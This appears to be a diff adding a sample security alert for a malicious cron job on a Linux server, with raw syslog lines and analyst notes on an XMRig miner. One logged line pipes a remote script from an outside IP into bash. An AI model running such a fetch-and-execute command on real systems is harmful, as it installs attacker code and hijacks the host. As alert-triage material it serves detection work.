@@ -1,0 +1,18 @@
+Alert Metadata:
+Alert Name: Malicious Cron Job Created
+Severity: High
+Timestamp: 2026-07-18T14:20:11Z
+Sensor: Datadog / Linux Syslog
+
+Raw Log Data:
+Jul 18 14:20:11 srv-db-01 crontab[22314]: (www-data) REPLACE (www-data)
+Jul 18 14:20:11 srv-db-01 crond[1144]: (www-data) RELOAD (/var/spool/cron/crontabs/www-data)
+Jul 18 14:21:01 srv-db-01 CRON[22390]: (www-data) CMD (curl -s http://185.11.20.1/c.sh | bash)
+
+Artifact Panel Context:
+
+Account Privilege: The www-data account typically does not execute cron jobs or shell scripts; it manages an older WordPress instance.
+
+Payload Analysis: The external script c.sh attempts to download and execute an XMRig cryptocurrency miner.
+
+Network History: Outbound traffic on port 80 to 185.11.20.1 began continuously following the execution.
